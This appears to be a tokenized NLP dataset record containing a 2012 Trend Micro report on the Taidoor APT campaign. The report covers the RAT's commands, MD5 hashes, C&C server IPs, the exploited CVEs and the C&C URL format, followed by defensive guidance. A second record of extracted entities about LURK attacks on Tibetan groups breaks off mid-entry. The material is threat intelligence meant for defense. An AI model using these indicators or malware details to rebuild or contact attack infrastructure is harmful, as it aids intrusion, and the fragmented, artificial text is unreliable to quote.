"address", "of", "analysis", "machine:", "08-00-2733-9C-23"], ["Encrypted", "data:", "\ufffd*\u4694l\ufffd\ufffd\ufffdS\ufffdW", "4\ufffdT\ufffd\ufffdF+UO"], ["Decrypted", "data:", "cmd/c", "ipconfig/all"], ["Command", "type:", "3"], ["Command", "string:", "cmd/c", "ipconfig/all"], ["The", "decrypted", "data", "shows", "that", "the", "C&C", "server", "is"], ["interested", "in", "IP", "configuration-related", "data", "in", "the", "victim\u2019s"], ["machine", ".", "The", "output", "of", "the", "command", "is", "then", "encrypted"], ["and", "sent", "to", "the", "C&C", "server", "."], ["Command", "type", "refers", "to", "a", "hex", "digit", "that", "can", "be", "[0x2]", ","], ["[0x3]", ",", "[0x4]", ",", "[0x5]", ",", "or", "[0x7]", ",", "which", "identifies", "what", "it", "will"], ["do", "with", "the", "command", "string", ".", "Command", "string", ",", "on", "the"], ["other", "hand", ",", "refers", "to", "a", "set", "of", "strings", "relevant", "to", "the"], ["command", "type", "."], ["Table", "1", "shows", "the", "full", "capabilities", "of", "the", "injected", "binary", "."], ["Command"], ["Description"], ["0x2\u2014sleep", "command"], ["The", "binary", "waits", "for", "a", "specified", "amount", "of", "time", "before", "requesting"], ["another", "command", "from", "the", "C&C", "server", "."], ["0x3\u2014execute", "commands", "on", "the", "system", "(i", ".", "e.,", "cmd/c"], ["This", "can", "be", "used", "to", "explore", "the", "data", "or", "files", "in", "the", "victim\u2019s", "machine"], ["for", "reporting", "back", "to", "the", "C&C", "server", ".", "This", "can", "also", "be", "used", "to"], ["explore", "the", "network", "to", "which", "the", "compromised", "machine", "is"], ["connected", "."], ["0x4\u2014download", "and", "execute", "file"], ["This", "can", "be", "used", "to", "install", "additional", "files", "in", "the", "victim\u2019s", "machine", "."], ["0x5\u2014download", "files", "from", "the", "C&C", "server"], ["The", "binary", "downloads", "but", "does", "not", "execute", "files", "from", "the", "C&C"], ["server", "."], ["0x7\u2014upload", "files", "from", "infected", "machine", "to", "the", "C&C"], ["server"], ["This", "can", "be", "used", "to", "exfiltrate", "data", "or", "files", "from", "the", "victim\u2019s", "network"], ["to", "the", "C&C", "server", "."], ["ipconfig/all)"], ["6", "|", "The", "Taidoor", "Campaign"], ["TIMELINE"], ["Using", "the", "Taidoor", "C&C", "servers", "we", "found", "using", "Trend", "Micro", "Smart", "Protection", "Network", "data", ",", "we", "constructed", "a", "timeline"], ["that", "indicates", "related", "activities", "as", "early", "as", "October", "2010", "(see", "Table", "2)", ".", "While", "we", "saw", "gaps", "in-between", "activities", ",", "notably"], ["between", "November", "2010", "and", "February", "2011", ",", "we", "consistently", "discovered", "malware", "samples", "connect", "to", "this", "infrastructure", "."], ["The", "dates", "when", "these", "were", "discovered", "may", "indicate", "exact", "dates", "of", "compromise", "."], ["MD5", "HASH"], ["DETECTION"], ["C&C", "SERVER"], ["DATE", "SEEN"], ["2d33005a26a9cb2063dde2fa179b453e"], ["216", ".", "139.109.156"], ["10/12/2010"], ["4b92f9b403fa59a35edf5af2f1aa98fb"], ["216", ".", "139.109.156"], ["10/12/2010"], ["95bfeb4b7b8edb2517ede938bf9791d9"], ["216", ".", "139.109.156"], ["10/12/2010"], ["5dd13efe319f0cdfe75346a46c1b791b"], ["TROJ_GEN", ".", "R42C3JR"], ["211", ".", "35.222.6"], ["10/14/2010"], ["1de1a60f51829e5e0d30dfd4b5197a72"], ["TROJ_DLOADE", ".", "SMJ"], ["216", ".", "139.109.156"], ["10/22/2010"], ["608bae3e4a59e4954f9bf43e504e2340"], ["TROJ_GEN", ".", "R47E1K9"], ["211", ".", "35.222.6"], ["10/27/2010"], ["b80da571f2cd7eab4aec12eee8199289"], ["TROJ_DLOADE", ".", "SMJ"], ["60", ".", "250.39.73"], ["11/23/2010"], ["0998743b808b57f6707641be64fa4fcd"], ["TROJ_DLOADR", ".", "TDG"], ["211", ".", "35.222.6"], ["2/25/2011"], ["920a7857da9ee7b403f3077660eddf31"], ["TROJ_DLOADR", ".", "TDG"], ["211", ".", "35.222.6"], ["2/25/2011"], ["d28b1b2824fd26d18f851e7605660f74"], ["TROJ_GEN", ".", "R21C3E6"], ["216", ".", "139.109.156"], ["4/15/2011"], ["265785ccc9503d30465156b90afa2523"], ["TROJ_GEN", ".", "R3EC2G4"], ["216", ".", "139.109.156"], ["4/28/2011"], ["7488ffd5d9c1751d1ceca88a4231304b"], ["TROJ_GEN", ".", "R4FCRBC"], ["216", ".", "139.109.156"], ["7/7/2011"], ["ecd97b7cfb4c8715d7800a9808a1646f"], ["TROJ_INJECT", ".", "ZZXX"], ["216", ".", "139.109.156"], ["8/10/2011"], ["6703dd35f6f56f35d298b9cd4c73e9cb"], ["BKDR_SIMBO", ".", "DUKKS"], ["216", ".", "139.109.156"], ["8/29/2011"], ["8406c1ae494add6e4f0e78b476fb4db0"], ["TROJ_ARTIEF", ".", "VTG"], ["60", ".", "249.219.82"], ["10/6/2011"], ["5fd848000d68f45271a0e1abd5844493"], ["TROJ_MSDROP", ".", "ZZXX"], ["60", ".", "249.219.82"], ["10/12/2011"], ["a0fff659499a4a76af2b89d28d0eafa2"], ["TROJ_GEN", ".", "R3EC1J7"], ["216", ".", "139.109.156"], ["10/14/2011"], ["97ff2338e568fc382d41c30c31f89720"], ["HEUR_OLEXP", ".", "A"], ["60", ".", "249.219.82"], ["10/30/2011"], ["d39981092a2f9a4b40413b38917ca573"], ["TROJ_GEN", ".", "R49C7KI"], ["61", ".", "222.205.180"], ["11/2/2011"], ["61", ".", "222.190.100"], ["11/6/2011"], ["f43c9cc84fa7c16321241bb3c0802760"], ["7", "|", "The", "Taidoor", "Campaign"], ["MD5", "HASH"], ["DETECTION"], ["C&C", "SERVER"], ["DATE", "SEEN"], ["c2cb594246942c328d8b11d4696a05c0"], ["BKDR_SIMBOT", ".", "SMC"], ["61", ".", "218.233.51"], ["4/30/2012"], ["63", ".", "135.55.13"], ["4/30/2012"], ["203", ".", "146.189.160"], ["4/7/2012"], ["203", ".", "150.231.236"], ["4/7/2012"], ["222", ".", "101.218.86"], ["5/29/2012"], ["64", ".", "34.60.218"], ["5/29/2012"], ["203", ".", "90.100.21"], ["5/29/2012"], ["65a0716af402727247296649abda7be6"], ["4a1365bdef0773aa0d3d33877d5a5334"], ["BKDR_SIMBOT", ".", "SMC"], ["BKDR_SIMBOT", ".", "SMC"], ["7f82c77a1f1b36f392f2f1763e2cc119"], ["BKDR_SIMBOT", ".", "SMC"], ["203", ".", "146.189.141"], ["4/30/2012"], ["ac75e62b36f4e845c1a095c9bcc43896"], ["TROJ_DLOADR", ".", "WKJ"], ["62", ".", "13.61.173"], ["4/2/2012"], ["61", ".", "218.233.51"], ["4/2/2012"], ["63", ".", "135.55.13"], ["4/2/2012"], ["112", ".", "217.74.188"], ["6/13/2012"], ["203", ".", "114.103.58"], ["6/13/2012"], ["5eb86d098a5ab48c7173545829008636"], ["BKDR_SIMBOT", ".", "SMC"], ["85c64f43de8cb83234ee21fb0234f256"], ["BKDR_SIMBOT", ".", "SMC"], ["203", ".", "146.189.141"], ["5/14/2012"], ["7f82c77a1f1b36f392f2f1763e2cc119"], ["BKDR_SIMBOT", ".", "SMC"], ["85", ".", "43.157.110"], ["4/30/2012"], ["203", ".", "116.147.94"], ["4/30/2012"], ["58", ".", "40.20.165"], ["4/30/2012"], ["213", ".", "50.91.196"], ["5/14/2012"], ["211", ".", "22.72.193"], ["5/14/2012"], ["69", ".", "178.171.135"], ["5/17/2012"], ["202", ".", "40.188.10"], ["5/17/2012"], ["85c64f43de8cb83234ee21fb0234f256"], ["ffe76a043871638ec5e953084af1a2d8"], ["BKDR_SIMBOT", ".", "SMC"], ["BKDR_SIMBOT", ".", "SME"], ["20db3ff24701f4adac3cc61b591b6c98"], ["BKDR_SIMBOT", ".", "SME"], ["60", ".", "248.216.194"], ["5/7/2012"], ["85c64f43de8cb83234ee21fb0234f256"], ["BKDR_SIMBOT", ".", "SMC"], ["201", ".", "159.226.189"], ["5/14/2012"], ["202", ".", "251.249.222"], ["5/14/2012"], ["222", ".", "101.218.86"], ["5/7/2012"], ["64", ".", "34.60.218"], ["5/7/2012"], ["20db3ff24701f4adac3cc61b591b6c98"], ["8", "|", "The", "Taidoor", "Campaign"], ["BKDR_SIMBOT", ".", "SME"], ["MD5", "HASH"], ["6b5ca357066b40def382a1e130fb87cb"], ["9", "|", "The", "Taidoor", "Campaign"], ["DETECTION"], ["BKDR_SIMBOT", ".", "SME"], ["C&C", "SERVER"], ["DATE", "SEEN"], ["203", ".", "90.100.21"], ["5/7/2012"], ["210", ".", "65.11.11"], ["4/25/2012"], ["DAMAGE"], ["DEFENDING", "AGAINST", "APTS"], ["After", "analyzing", "of", "the", "Taidoor", "campaign", ",", "we", "saw", "that"], ["the", "malware", "the", "attackers", "used", "had", "the", "functionality"], ["normally", "seen", "in", "a", "Remote", "Access", "Trojan", "(RAT)", ".", "Based"], ["on", "the", "command", "capabilities", "of", "the", "Taidoor", "malware", ",", "we"], ["were", "able", "to", "determine", "that", "data", "theft", "and", "data"], ["destruction", "was", "possible", ".", "The", "malware", "also", "had", "the"], ["ability", "to", "remotely", "and", "sometimes", "randomly", "terminate"], ["processes", "on", "victims\u2019", "machines", ".", "This", "can", "lead", "to", "the"], ["termination", "of", "a", "critical", "process", "that", "results", "in", "denial", "of"], ["service", "(DoS)", ".", "If", "this", "happens", "on", "a", "critical", "server", ",", "this"], ["can", "cause", "loss", "of", "business", "revenue", "or", "critical", "data", "."], ["Sufficiently", "motivated", "threat", "actors", "can", "penetrate", "even"], ["networks", "that", "use", "moderately", "advanced", "security"], ["measures", ".", "As", "such", ",", "apart", "from", "standard", "and", "relevant"], ["attack", "prevention", "measures", "and", "mechanisms", "such", "as"], ["solid", "patch", "management;", "endpoint", "and", "network"], ["security;", "firewall", "use;", "and", "the", "like", ",", "enterprises", "should"], ["also", "focus", "on", "detecting", "and", "mitigating", "attacks", "."], ["Moreover", ",", "data", "loss", "prevention", "(DLP)", "strategies", "such", "as"], ["identifying", "exactly", "what", "an", "organization", "is", "protecting"], ["and", "taking", "into", "account", "the", "context", "of", "data", "use", "should"], ["be", "employed", "."], ["L", "ocal", "and", "E", "xter", "nal", "T", "hr", "eat"], ["Intelligence"], ["Threat", "intelligence", "refers", "to", "indicators", "that", "can", "be", "used"], ["to", "identify", "the", "tools", ",", "tactics", ",", "and", "procedures", "threat"], ["actors", "engaging", "in", "targeted", "attacks", "utilize", ".", "Both"], ["external", "and", "local", "threat", "intelligence", "is", "crucial", "for"], ["developing", "the", "ability", "to", "detect", "attacks", "early", ".", "The"], ["following", "are", "the", "core", "components", "of", "this", "defense"], ["strategy:"], ["\u2022"], ["\u2022"], ["\u2022"], ["10", "|", "T", "h", "e", "T", "a", "i", "d", "o", "o", "r", "C", "a", "m", "p", "a", "i", "g", "n"], ["Enhanced", "visibility:", "Logs", "from", "endpoint", ",", "server", ","], ["and", "network", "monitoring", "are", "an", "important", "and"], ["often", "underused", "resource", "that", "can", "be"], ["aggregated", "to", "provide", "a", "view", "of", "the", "activities"], ["within", "an", "organization", "that", "can", "be", "processed"], ["for", "anomalous", "behaviors", "that", "can", "indicate", "a"], ["targeted", "attack", "."], ["Integrity", "checks:", "In", "order", "to", "maintain"], ["persistence", ",", "malware", "will", "make", "modifications", "to"], ["the", "file", "system", "and", "registry", ".", "Monitoring", "such"], ["changes", "can", "indicate", "the", "presence", "of", "malware", "."], ["Empowering", "the", "human", "analyst:", "Humans", "are"], ["best", "positioned", "to", "identify", "anomalous", "behaviors"], ["when", "presented", "with", "a", "view", "of", "aggregated", "logs"], ["from", "across", "a", "network", ".", "This", "information", "is", "used"], ["in", "conjunction", "with", "custom", "alerts", "based", "on", "the"], ["local", "and", "external", "threat", "intelligence", "available", "."], ["Technologies", "available", "today", "such", "as", "Trend", "Micro\u2122"], ["Deep", "Discovery", "provide", "visibility", ",", "insight", ",", "and", "control"], ["over", "networks", "to", "defend", "against", "targeted", "threats", ".", "12"], ["Deep", "Discovery", "uniquely", "detects", "and", "identifies", "evasive"], ["threats", "in", "real", "time", "and", "provides", "in-depth", "analysis", "and"], ["actionable", "intelligence", "to", "prevent", ",", "discover", ",", "and", "reduce"], ["risks", "."], ["Mitigation", "and", "Cleanup", "S", "tr", "ategy"], ["Once", "an", "attack", "is", "identified", ",", "the", "cleanup", "strategy", "should"], ["focus", "on", "the", "following", "objectives:"], ["\u2022"], ["\u2022"], ["\u2022"], ["Determine", "the", "attack", "vector", "and", "cut", "off"], ["communications", "with", "the", "C&C", "server", "."], ["Determine", "the", "scope", "of", "the", "compromise", "."], ["Assess", "the", "damage", "by", "analyzing", "the", "data", "and"], ["forensic", "artifacts", "available", "on", "compromised"], ["machines", "."], ["Remediation", "should", "be", "applied", "soon", "afterward", ",", "which"], ["includes", "steps", "to", "fortify", "affected", "servers", ",", "machines", ",", "or"], ["devices", "into", "secure", "states", ",", "informed", "in", "part", "by", "how", "the"], ["compromised", "machines", "were", "infiltrated", "."], ["12"], ["http://www", ".", "trendmicro.com/us/enterprise/security-riskmanagement/deep-discovery/index.html"], ["11", "|", "T", "h", "e", "T", "a", "i", "d", "o", "o", "r", "C", "a", "m", "p", "a", "i", "g", "n"], ["E", "ducating", "E", "mployees", "Against", "S", "ocial"], ["E", "ngineering"], ["Security-related", "policies", "and", "procedures", "combined", "with"], ["education", "and", "training", "programs", "are", "essential"], ["components", "of", "defense", ".", "Traditional", "training", "methods"], ["can", "be", "fortified", "by", "simulations", "and", "exercises", "using", "real"], ["spear-phishing", "attempts", "sent", "to", "test", "employees", "."], ["Employees", "trained", "to", "expect", "targeted", "attacks", "are", "better"], ["positioned", "to", "report", "potential", "threats", "and", "constitute", "an"], ["important", "source", "of", "threat", "intelligence", "."], ["Data-Centr", "ic", "P", "r", "otection", "S", "tr", "ategy"], ["The", "ultimate", "objective", "of", "targeted", "attacks", "is", "to", "acquire"], ["sensitive", "data", ".", "As", "such", ",", "DLP", "strategies", "that", "focus", "on"], ["identifying", "and", "protecting", "confidential", "information", "are"], ["critical", ".", "Enhanced", "data", "protection", "and", "visibility", "across"], ["an", "enterprise", "provides", "the", "ability", "to", "control", "access", "to"], ["sensitive", "data", "as", "well", "as", "monitor", "and", "log", "successful", "and"], ["unsuccessful", "attempts", "to", "access", "it", ".", "Enhanced", "access"], ["control", "and", "logging", "capabilities", "allow", "security", "analysts"], ["to", "locate", "and", "investigate", "anomalies", ",", "respond", "to"], ["incidents", ",", "and", "initiate", "remediation", "strategies", "and"], ["damage", "assessment", "."], ["TREND", "MICRO", "THREAT", "PROTECTION", "AGAINST", "TAIDOOR", "CAMPAIGN", "COMPONENTS"], ["Table", "3", "summarizes", "the", "Trend", "Micro", "solutions", "for", "the", "components", "of", "the", "Taidoor", "campaign", ".", "Trend", "Micro", "recommends", "a"], ["comprehensive", "security", "risk", "management", "strategy", "that", "goes", "further", "than", "advanced", "protection", "to", "meet", "the", "real-time"], ["threat", "management", "requirements", "of", "dealing", "with", "targeted", "attacks", "."], ["Attack", "Component"], ["Protection", "Technology"], ["Trend", "Micro", "Solution"], ["Initial", "C&C", "server", "request", "format:"], ["Web", "Reputation"], ["Endpoint", "(Titanium", ",", "Worry-Free"], ["[C&C]/{5", "random"], ["characters}", ".", "php?id={6", "random"], ["numbers}{encrypted", "victim\u2019s"], ["MAC", "address}"], ["Business", "Security", ",", "OfficeScan)"], ["Server", "(Deep", "Security)"], ["Messaging", "(InterScan", "Messaging"], ["Security", ",", "ScanMail", "Suite", "for", "Microsoft"], ["Exchange)"], ["Network", "(Deep", "Discovery)"], ["Gateway", "(InterScan", "Web", "Security", ","], ["InterScan", "Messaging", "Security)"], ["Mobile", "(Mobile", "Security)"], ["BKDR_SIMBO", ".", "DUKKS"], ["File", "Reputation"], ["BKDR_SIMBOT", ".", "SMC"], ["(Antivirus/Anti-malware)"], ["BKDR_SIMBOT", ".", "SME"], ["HEUR_OLEXP", ".", "A"], ["TROJ_ARTIEF", ".", "VTG"], ["TROJ_DLOADE", ".", "SMJ"], ["Endpoint", "(Titanium", ",", "Worry-Free"], ["Business", "Security", ",", "OfficeScan)"], ["Server", "(Deep", "Security)"], ["Messaging", "(InterScan", "Messaging"], ["Security", ",", "ScanMail", "Suite", "for", "Microsoft"], ["Exchange)"], ["Network", "(Deep", "Discovery)"], ["Gateway", "(InterScan", "Web", "Security", ","], ["TROJ_DLOADR", ".", "TDG"], ["InterScan", "Messaging", "Security)"], ["TROJ_DLOADR", ".", "WKJ"], ["Mobile", "(Mobile", "Security)"], ["TROJ_GEN", ".", "R21C3E6"], ["TROJ_GEN", ".", "R3EC1J7"], ["TROJ_GEN", ".", "R3EC2G4"], ["TROJ_GEN", ".", "R3EC7JC"], ["12", "|", "T", "h", "e", "T", "a", "i", "d", "o", "o", "r", "C", "a", "m", "p", "a", "i", "g", "n"], ["Attack", "Component"], ["Protection", "Technology"], ["Trend", "Micro", "Solution"], ["Vulnerability", "Shielding/Virtual"], ["Patching"], ["Server", "(Deep", "Security)"], ["TROJ_GEN", ".", "R42C3JR"], ["TROJ_GEN", ".", "R47E1K9"], ["TROJ_GEN", ".", "R49C7KI"], ["TROJ_GEN", ".", "R4FCRBC"], ["TROJ_INJECT", ".", "ZZXX"], ["TROJ_MSDROP", ".", "ZZXX"], ["CVE-2009-3129"], ["CVE-2009-4324"], ["CVE-2010-1297"], ["CVE-2010-2883"], ["Endpoint", "(OfficeScan", "with", "Intrusion"], ["Defense", "Firewall", "Plug-In)"], ["For", "CVE-2009-3129:"], ["\u2022"], ["CVE-2011-0611"], ["Rule", "#1003817", "(Excel"], ["Featheader", "Record", "Memory"], ["Corruption", "Vulnerability)"], ["CVE-2011-1269"], ["For", "CVE-2009-4324:"], ["CVE-2012-0158"], ["\u2022"], ["Rule", "#1004008", "(Adobe"], ["Reader", "and", "Acrobat"], ["'newplayer()'", "JavaScript"], ["Method", "Code", "Execution)"], ["For", "CVE-2010-1297:"], ["\u2022"], ["Rule", "#1004202", "(Adobe"], ["Products", "authplay", ".", "dll", "Remote"], ["Code", "Execution", "Vulnerability)"], ["For", "CVE-2010-2883:"], ["\u2022"], ["Rule", "#1004393", "(Adobe"], ["Reader", "SING", "Table", "Parsing"], ["Vulnerability)"], ["\u2022"], ["Rule", "#1004113", "(Identified"], ["Malicious", "Adobe", "PDF"], ["Document)"], ["\u2022"], ["Rule", "#1004315", "(Identified"], ["Malicious", "Adobe", "PDF"], ["Document)"], ["For", "CVE-2011-0611:"], ["\u2022"], ["13", "|", "T", "h", "e", "T", "a", "i", "d", "o", "o", "r", "C", "a", "m", "p", "a", "i", "g", "n"], ["Rule", "#1004647", "(Restrict"], ["Microsoft", "Office", "File", "with"], ["Embedded", "SWF)"], ["Attack", "Component"], ["Protection", "Technology"], ["Trend", "Micro", "Solution"], ["For", "CVE-2011-1269:"], ["\u2022"], ["Rule", "#1004661", "(Microsoft"], ["PowerPoint", "Remote", "Code"], ["Execution", "Vulnerability)"], ["For", "CVE-2012-0158:"], ["58", ".", "40.20.165"], ["Web", ",", "Domain", ",", "and", "IP", "Reputation"], ["60", ".", "248.216.194"], ["60", ".", "249.219.82"], ["60", ".", "250.39.73"], ["61", ".", "222.190.100"], ["61", ".", "222.205.180"], ["\u2022"], ["Rule", "#1004973"], ["(MSCOMCTL", ".", "OCX", "RCE"], ["Vulnerability", "for", "Rich", "Text"], ["File)"], ["\u2022"], ["Rule", "#1004977", "(Restrict"], ["Microsoft", "Windows", "Common"], ["ListView", "and", "TreeView"], ["ActiveX", "Controls)"], ["\u2022"], ["Rule#1004978"], ["(MSCOMCTL", ".", "OCX", "RCE"], ["Vulnerability", "for", "Office", "Binary"], ["File)"], ["Endpoint", "(Titanium", ",", "Worry-Free"], ["Business", "Security", ",", "OfficeScan)"], ["Server", "(Deep", "Security)"], ["Messaging", "(InterScan", "Messaging"], ["Security", ",", "ScanMail", "Suite", "for", "Microsoft"], ["Exchange)"], ["Network", "(Deep", "Discovery)"], ["Gateway", "(InterScan", "Web", "Security", ","], ["61", ".", "218.233.51"], ["InterScan", "Messaging", "Security)"], ["62", ".", "13.61.173"], ["Mobile", "(Mobile", "Security)"], ["63", ".", "135.55.13"], ["64", ".", "34.60.218"], ["69", ".", "178.171.135"], ["85", ".", "43.157.110"], ["112", ".", "217.74.188"], ["201", ".", "159.226.189"], ["202", ".", "40.188.10"], ["202", ".", "251.249.222"], ["14", "|", "T", "h", "e", "T", "a", "i", "d", "o", "o", "r", "C", "a", "m", "p", "a", "i", "g", "n"], ["Attack", "Component"], ["Protection", "Technology"], ["203", ".", "90.100.21"], ["203", ".", "114.103.58"], ["203", ".", "116.147.94"], ["203", ".", "146.189.141"], ["203", ".", "146.189.160"], ["203", ".", "150.231.236"], ["210", ".", "65.11.11"], ["211", ".", "35.222.6"], ["211", ".", "22.72.193"], ["213", ".", "50.91.196"], ["216", ".", "139.109.156"], ["222", ".", "101.218.86"], ["15", "|", "T", "h", "e", "T", "a", "i", "d", "o", "o", "r", "C", "a", "m", "p", "a", "i", "g", "n"], ["Trend", "Micro", "Solution"], ["August", "2012", "|", "APT", "Campaign", "Quick", "Profile:", "Taidoor"], ["Advanced", "persistent", "threats", "(APTs)", "refer", "to", "a", "category", "of", "threats", "that", "aggressively", "pursue", "and", "compromise", "specific"], ["targets", "to", "maintain", "persistent", "presence", "within", "the", "victim\u2019s", "network", "so", "they", "can", "move", "laterally", "and", "exfiltrate", "data", "."], ["Unlike", "indiscriminate", "cybercrime", "attacks", ",", "spam", ",", "web", "threats", ",", "and", "the", "like", ",", "APTs", "are", "much", "harder", "to", "detect", "because"], ["of", "the", "targeted", "nature", "of", "related", "components", "and", "techniques", ".", "Also", ",", "while", "cybercrime", "focuses", "on", "stealing", "credit", "card"], ["and", "banking", "information", "to", "gain", "profit", ",", "APTs", "are", "better", "thought", "of", "as", "cyber", "espionage", "."], ["TAIDOOR"], ["\u2022", "First", "Seen"], ["Individual", "targeted", "attacks", "are", "not", "one-off", "attempts", ".", "Attackers", "continually", "try", "to", "get", "inside", "the", "target\u2019s", "network", "."], ["Based", "on", "Trend", "Micro\u2122", "Smart", "Protection", "Network\u2122", "data", ",", "the", "earliest", "Taidoor", "campaign-related", "activities", "were", "seen", "as", "far", "back", "as", "October", "2010", "."], ["\u2022", "Victims", "and", "Targets"], ["APT", "campaigns", "target", "specific", "industries", "or", "communities", "of", "interest", "in", "specific", "regions", "."], ["This", "campaign", "primarily", "targeted", "government", "organizations", "located", "in", "Taiwan", "."], ["\u2022", "Operations"], ["The", "first-stage", "computer", "intrusions", "often", "use", "social", "engineering", ".", "Attackers", "custom-fit", "attacks", "to", "their", "targets", "."], ["In", "this", "campaign", ",", "attackers", "sent", "an", "email", "to", "targets", ".", "The", "email", "came", "with", "specially", "created", "file", "attachments", "that", "exploited", "vulnerabilities", "such", "as"], ["CVE-2012-0158", ",", "CVE-2009-4324", ",", "CVE-2010-1297", ",", "CVE-2010-2883", ",", "CVE-2011-0611", ",", "CVE-2011-1269", ",", "and", "CVE-2009-3129", ".", "The", "purpose", "of", "the", "file"], ["attachment", "is", "to", "drop", "and", "install", "SIMBOT", "malware", "variants", ",", "which", "had", "functionalities", "normally", "seen", "in", "Remote", "Access", "Trojans", "(RATs)", "."], ["\u2022", "Possible", "Indicators", "of", "Compromise"], ["Attackers", "want", "to", "remain", "undetected", "as", "long", "as", "possible", ".", "A", "key", "characteristic", "of", "these", "attacks", "is", "stealth", "."], ["The", "GET", "and", "POST", "requests", "from", "compromised", "computers", "contained", "a", "URL", "path", "in", "the", "following", "format", ",", "aaaaa", ".", "php?id=bbbbbbcccccccccccc,", "where"], ["\u201caaaaa\u201d", "refers", "to", "five", "random", "characters", "that", "form", "a", "file", "name", ",", "\u201cbbbbbb", ",", "\u201d", "refers", "to", "six", "pseudorandomly", "generated", "characters", "that", "change", "for", "each"], ["connection", ",", "and", "\u201ccccccccccccc\u201d", "refers", "to", "12", "characters", "that", "represent", "the", "compromised", "host\u2019s", "MAC", "address", "that", "is", "obfuscated", "using", "a", "custom"], ["algorithm", "."], ["In", "addition", ",", "the", "initial", "command-and-control", "(C&C)", "server", "request", "typically", "uses", "the", "following", "format:"], ["[C&C]/{5", "random", "characters}", ".", "php?id={6", "random", "numbers}{encrypted", "victim\u2019s", "MAC", "address}"], ["*"], ["The", "full", "technical", "details", "of", "this", "attack", "can", "be", "read", "in", "the", "Trend", "Micro", "research", "paper", ",", "\u201cThe", "Taidoor", "Campaign:", "An", "In-Depth", "Analysis", ".", "\u201d", "The"], ["characteristics", "highlighted", "in", "this", "APT", "campaign", "profile", "reflect", "the", "results", "of", "our", "investigation", "as", "of", "August", "2012", "."], ["TR", "E", "ND", "MICR", "O\u2122"], ["TR", "E", "ND", "MICR", "O", "INC", "."], ["Trend", "Micro", "Incorporated", "(TYO:", "4704;", "TSE:", "4704)", ",", "a", "global", "cloud", "security", "leader", ","], ["creates", "a", "world", "safe", "for", "exchanging", "digital", "information", "with", "its", "Internet", "content"], ["security", "and", "threat", "management", "solutions", "for", "businesses", "and", "consumers", ".", "A", "pioneer"], ["in", "server", "security", "with", "over", "20", "years\u2019", "experience", ",", "we", "deliver", "top-ranked", "client", ","], ["server", "and", "cloud-based", "security", "that", "fits", "our", "customers\u2019", "and", "partners\u2019", "needs", ",", "stops"], ["new", "threats", "faster", ",", "and", "protects", "data", "in", "physical", ",", "virtualized", "and", "cloud"], ["environments", ".", "Powered", "by", "the", "industry-leading", "Trend", "Micro\u2122", "Smart", "Protection"], ["Network\u2122", "cloud", "computing", "security", "infrastructure", ",", "our", "products", "and", "services", "stop"], ["threats", "where", "they", "emerge\u2014from", "the", "Internet", ".", "They", "are", "supported", "by", "1", ",", "000+", "threat"], ["intelligence", "experts", "around", "the", "globe", "."], ["10101", "N", ".", "De", "Anza", "Blvd", "."], ["Cupertino", ",", "CA", "95014"], ["U", ".", "S.", "toll", "free:", "1", "+800", ".", "228.5651"], ["Phone:", "1", "+408", ".", "257.1500"], ["Fax:", "1", "+408", ".", "257.2003"], ["www", ".", "trendmicro.com"], ["\u00a9", "20", "12", "by", "Trend", "Micro", ",", "Incorporated", ".", "All", "rights", "reserved", ".", "Trend", "Micro", "and", "the", "T", "rend", "Micro", "t-ball", "logo", "are", "trademarks", "or", "registered", "trademarks", "of", "Trend", "Micro", ",", "Incorporated", ".", "All"], ["other", "product", "or", "company", "names", "may", "be", "trademarks", "or", "registered", "trademarks", "of", "their", "owners", "."]]}], [{"vertexSet": [{"old_id": "T1", "type": "ExploitTargetObject", "name": "Tibetan organizations", "sent_id": 7, "pos": []}, {"old_id": "T2", "type": "Malware", "name": "LURK", "sent_id": 4, "pos": [7]}, {"old_id": "T3", "type": "Software", "name": "Microsoft Office", "sent_id": 16, "pos": [1, 2]}, {"old_id": "T4", "type": "TrojanHorse", "name": "LURK", "sent_id": 19, "pos": [11]}, {"old_id": "T5", "type": "TrojanHorse", "name": "Gh0stRAT", "sent_id": 20, "pos": [5]}, {"old_id": "T6", "type": "Address", "name": "18410564183", "sent_id": 23, "pos": []}, {"old_id": "T7", "type": "Indicator", "name": "dtleatuocom", "sent_id": 24, "pos": []}, {"old_id": "T8", "type": "Indicator", "name": "dtldnsdme", "sent_id": 23, "pos": []}, {"old_id": "T9", "type": "Organization", "name": "Citizen Lab", "sent_id": 31, "pos": [4, 5]}, {"old_id": "T10", "type": "Time", "name": "May and July 2012", "sent_id": 35, "pos": [7, 10]}, {"old_id": "T11", "type": "TrojanHorse", "name": "LURK", "sent_id": 41, "pos": [0]}, {"old_id": "T12", "type": "MalwareCharacteristics", "name": "social engineering", "sent_id": 42, "pos": [6, 7]}, {"old_id": "T13", "type": "Software", "name": "Microsoft Office", "sent_id": 50, "pos": [4, 5]}, {"old_id": "T14", "type": "Software", "name": "Word", "sent_id": 50, "pos": [9]}, {"old_id": "T15", "type": "Software", "name": "Excel", "sent_id": 50, "pos": [13]}, {"old_id": "T16", "type": "Time", "name": "May 24 2012", "sent_id": 60, "pos": []}, {"old_id": "T17", "type": "Address", "name": "20923420431", "sent_id": 62, "pos": []}, {"old_id": "T18", "type": "Email", "name": "Droeshi", "sent_id": 59, "pos": []}, {"old_id": "T19", "type": "Password", "name": "4155", "sent_id": 66, "pos": [6]}, {"old_id": "T20", "type": "File", "name": "Droeshi finaldoc", "sent_id": 66, "pos": []}, {"old_id": "T21", "type": "Time", "name": "July 5", "sent_id": 71, "pos": [6, 7]}, {"old_id": "T22", "type": "Email", "name": "Statement of the Kashag", "sent_id": 70, "pos": []}, {"old_id": "T23", "type": "Password", "name": "0706", "sent_id": 72, "pos": [3]}, {"old_id": "T24", "type": "Address", "name": "6516697211", "sent_id": 75, "pos": []}, {"old_id": "T25", "type": "Email", "name": "eabliz@gmxcom", "sent_id": 76, "pos": []}, {"old_id": "T26", "type": "Email", "name": "hientr@gmxcom", "sent_id": 76, "pos": []}, {"old_id": "T27", "type": "File", "name": "July6thFinaldoc", "sent_id": 77, "pos": []}, {"old_id": "T28", "type": "Email", "name": "The concept notes", "sent_id": 79, "pos": []}, {"old_id": "T29", "type": "Time", "name": "July 17", "sent_id": 80, "pos": [8, 9]}, {"old_id": "T30", "type": "File", "name": "EIDHR_action_planxlsx", "sent_id": 84, "pos": []}, {"old_id": "T31", "type": "Password", "name": "19333", "sent_id": 98, "pos": [10]}, {"old_id": "T32", "type": "Attacker", "name": "walkinnet", "sent_id": 105, "pos": []}, {"old_id": "T33", "type": "Email", "name": "c100tibet_board@gmxcom", "sent_id": 111, "pos": []}, {"old_id": "T34", "type": "Email", "name": "ijoni_futbollisti@gmxcom", "sent_id": 111, "pos": []}, {"old_id": "T35", "type": "Email", "name": "abarbour@gmxcom", "sent_id": 